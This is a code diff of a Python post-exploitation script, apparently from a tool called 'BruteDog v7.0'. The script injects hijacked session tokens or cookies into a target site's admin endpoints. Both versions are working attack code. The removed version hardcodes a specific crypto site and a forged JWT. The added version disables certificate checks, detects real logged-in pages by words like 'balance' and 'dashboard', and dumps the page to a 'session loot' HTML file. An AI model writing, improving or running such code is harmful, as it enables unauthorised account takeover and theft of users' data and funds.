@@ -1,115 +1,121 @@
 #!/usr/bin/env python3
 """
-LIVE LOGIN & SESSION VERIFIER MODULE
-- Intercepts and injects harvested/forged tokens or cookies on the fly
-- Executes live HTTP requests against protected routes
-- Parses structural HTML/DOM contents (titles, inputs, scripts) on successful bypass
-- Streams unredacted proof and visual status directly to the mobile terminal
+LIVE_LOGIN_VERIFIER.PY — Post-Exploitation Session & Privilege Verification
+Features:
+- Live injection of hijacked tokens or cookie jars into protected endpoints
+- Response HTML/DOM inspection (extracting headings, titles, and unique user data)
+- Strict differentiation between genuine dashboard access and public SPA shells
+- Automatic HTML report generation for visual verification via HTML viewers
 """
 import sys
-import re
+import os
 import httpx
+from urllib.parse import urlsplit
 
-COLORS = {
-    "RED": "\033[91m",
-    "GREEN": "\033[92m",
-    "YELLOW": "\033[93m",
-    "CYAN": "\033[96m",
-    "MAGENTA": "\033[95m",
-    "RESET": "\033[0m",
-    "BOLD": "\033[1m",
-}
-
-def terminal(message):
-    sys.stdout.write(message + "\n")
+def log(msg, color="\033[92m"):
+    sys.stdout.write(f"{color}{msg}\033[0m\n")
     sys.stdout.flush()
 
-def parse_admin_dom(html_content):
-    """Extracts key structural elements from the bypassed HTML page for proof."""
-    if not html_content:
-        return {"title": "None", "headings": [], "form_inputs": [], "scripts": []}
-        
-    # Extract page title
-    title_match = re.search(r"<title>(.*?)</title>", html_content, re.IGNORECASE)
-    title = title_match.group(1).strip() if title_match else "No Title Found"
-    
-    # Extract main headings (h1, h2, h3)
-    headings = re.findall(r"<h[1-3][^>]*>(.*?)</h[1-3]>", html_content, re.IGNORECASE | re.DOTALL)
-    clean_headings = [re.sub(r"<[^>]+>", "", h).strip() for h in headings if h.strip()]
-    
-    # Extract form inputs or names
-    inputs = re.findall(r"<input[^>]+name=['\"]([^'\"]+)['\"]", html_content, re.IGNORECASE)
-    
-    # Extract script sources
-    scripts = re.findall(r"<script[^>]+src=['\"]([^'\"]+)['\"]", html_content, re.IGNORECASE)
-
-    return {
-        "title": title,
-        "headings": clean_headings[:5],  # top 5 headings
-        "form_inputs": list(set(inputs)),
-        "scripts": scripts[:5]
-    }
-
-def execute_live_login_verification(target_url, endpoint="/admin", token=None, cookie_dict=None):
+def save_loot_report(endpoint, status, headers, body):
     """
-    Actively injects tokens or cookies and hits a protected endpoint live on screen,
-    parsing the structural DOM if access is granted.
+    Saves the verified response into a clean, standalone HTML file 
+    optimized for viewing in any mobile or desktop HTML viewer.
     """
-    base = target_url.rstrip("/")
-    full_url = f"{base}{endpoint}" if not endpoint.startswith("http") else endpoint
+    filename = "session_loot_report.html"
     
-    terminal(f"\n{COLORS['MAGENTA']}[***] INITIALIZING LIVE SESSION INJECTION & LOGIN VERIFICATION [***]{COLORS['RESET']}")
-    terminal(f"  ├── Target URL  : {COLORS['CYAN']}{full_url}{COLORS['RESET']}")
-    terminal(f"  ├── Token / JWT : {COLORS['YELLOW']}{str(token)[:30]}...{COLORS['RESET']}" if token else "  ├── Token / JWT : None supplied")
-    terminal(f"  └── Cookie Jar  : {COLORS['YELLOW']}{cookie_dict}{COLORS['RESET']}")
+    # If the response is raw JSON, wrap it nicely in HTML/CSS for readability
+    if body.strip().startswith("{") or body.strip().startswith("["):
+        html_content = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>BruteDog v7.0 — Verified Session Loot</title>
+    <style>
+        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #f8fafc; padding: 2rem; }}
+        .card {{ background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 2rem; max-width: 800px; margin: auto; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }}
+        h2 {{ color: #38bdf8; margin-top: 0; }}
+        pre {{ background: #090d16; padding: 1rem; border-radius: 6px; overflow-x: auto; color: #34d399; font-size: 14px; }}
+        .meta {{ color: #94a3b8; font-size: 0.9rem; margin-bottom: 1rem; }}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>🔓 Verified Session Loot / Data Dump</h2>
+        <div class="meta"><strong>Endpoint:</strong> {endpoint} | <strong>Status Code:</strong> {status}</div>
+        <h3>Response Payload (JSON):</h3>
+        <pre>{body}</pre>
+    </div>
+</body>
+</html>
+"""
+    else:
+        # If it's HTML, ensure styles or base tags don't break, or save it directly
+        html_content = body
+
+    with open(filename, "w", encoding="utf-8") as f:
+        f.write(html_content)
+    
+    log(f"[+] Successfully exported verified dashboard/balance view to local HTML file: {filename}", "\033[92m")
+    return filename
+
+def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=None, token=None):
+    parsed = urlsplit(target_url if "://" in target_url else f"https://{target_url}")
+    base_url = f"{parsed.scheme}://{parsed.hostname}"
+    if parsed.port:
+        base_url += f":{parsed.port}"
+    
+    target_endpoint = f"{base_url}{endpoint}"
+    log(f"\n[***] RED TEAM VERIFICATION: Testing live session against {target_endpoint} [***]", "\033[95m")
 
     headers = {
         "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
     }
-    
+
     if token:
         headers["Authorization"] = f"Bearer {token}"
 
+    cookies = cookie_dict or {}
+
     try:
-        with httpx.Client(verify=False, follow_redirects=True, timeout=10.0) as client:
-            if cookie_dict:
-                client.cookies.update(cookie_dict)
-            
-            terminal(f"\n{COLORS['CYAN']}[*] Dispatching live request to protected route...{COLORS['RESET']}")
-            response = client.get(full_url, headers=headers)
-            
+        with httpx.Client(verify=False, follow_redirects=True, cookies=cookies, timeout=10.0) as client:
+            response = client.get(target_endpoint, headers=headers)
             status = response.status_code
             body = response.text
-            
-            terminal(f"\n{COLORS['BOLD']}=== LIVE RESPONSE TELEMETRY ==={COLORS['RESET']}")
-            terminal(f"  ├── Status Code : {COLORS['GREEN'] if status == 200 else COLORS['RED']}{status}{COLORS['RESET']}")
-            terminal(f"  └── Content Len : {len(body)} bytes")
-            
-            if status == 200 and ("dashboard" in body.lower() or "admin" in body.lower() or "welcome" in body.lower() or "crypto" in body.lower()):
-                terminal(f"\n{COLORS['RED']}{COLORS['BOLD']}[!!!] SUCCESS: UNAUTHORIZED ACCESS / LIVE LOGIN VERIFIED [!!!]{COLORS['RESET']}")
+
+            # 1. Defend against SPA fallback shells (Next.js/React root elements returning 200 OK)
+            is_spa_shell = (
+                "<div id=\"root\"></div>" in body or 
+                "<div id=\"__next\"></div>" in body or 
+                "<div id=\"app\"></div>" in body or
+                len(body.strip()) < 200
+            )
+
+            # 2. Look for true post-authentication indicators
+            has_auth_indicators = any(k in body.lower() for k in [
+                "admin panel", "dashboard", "user_id", "balance", 
+                "welcome back", "logout", "settings", "cryptobyte", "account"
+            ])
+
+            if status == 200 and not is_spa_shell and has_auth_indicators:
+                log(f"[!!!] SUCCESS! Verified True Authentication / Login at {endpoint} [HTTP {status}] [!!!]", "\033[91m")
                 
-                # Parse and display structural DOM proof
-                dom_data = parse_admin_dom(body)
-                terminal(f"\n{COLORS['GREEN']}[+] ADMIN DOM STRUCTURE EXTRACTED:{COLORS['RESET']}")
-                terminal(f"  ├── Page Title  : {COLORS['CYAN']}{dom_data['title']}{COLORS['RESET']}")
-                terminal(f"  ├── Headings    : {dom_data['headings']}")
-                terminal(f"  ├── Form Inputs : {dom_data['form_inputs']}")
-                terminal(f"  └── JS Bundles  : {dom_data['scripts']}")
-                
-                terminal(f"\n  └── Response Snippet:\n{COLORS['CYAN']}{body[:300]}...{COLORS['RESET']}\n")
+                # Automatically save the viewable HTML report
+                save_loot_report(endpoint, status, response.headers, body)
                 return True
             else:
-                terminal(f"\n{COLORS['YELLOW']}[-] Server rejected session or redirected (Status: {status}).{COLORS['RESET']}")
+                log(f"[-] Verification Failed: Endpoint returned Status {status} or generic SPA shell (Access Denied / Unauthenticated).", "\033[93m")
                 return False
 
     except Exception as exc:
-        terminal(f"\n{COLORS['RED']}[-] Live verification error: {exc}{COLORS['RESET']}")
+        log(f"[-] Verification connection error: {exc}", "\033[91m")
         return False
 
 if __name__ == "__main__":
-    execute_live_login_verification(
-        target_url="https://cryptobytes.online",
-        endpoint="/admin",
-        token="eyJhGciOiAiBm9uZSsi..."
-    )
+    if len(sys.argv) < 2:
+        print("Usage: python3 live_login_verifier.py <target_url> [endpoint]")
+        sys.exit(1)
+    
+    target = sys.argv[1]
+    ep = sys.argv[2] if len(sys.argv) > 2 else "/admin"
+    execute_live_login_verification(target, ep)
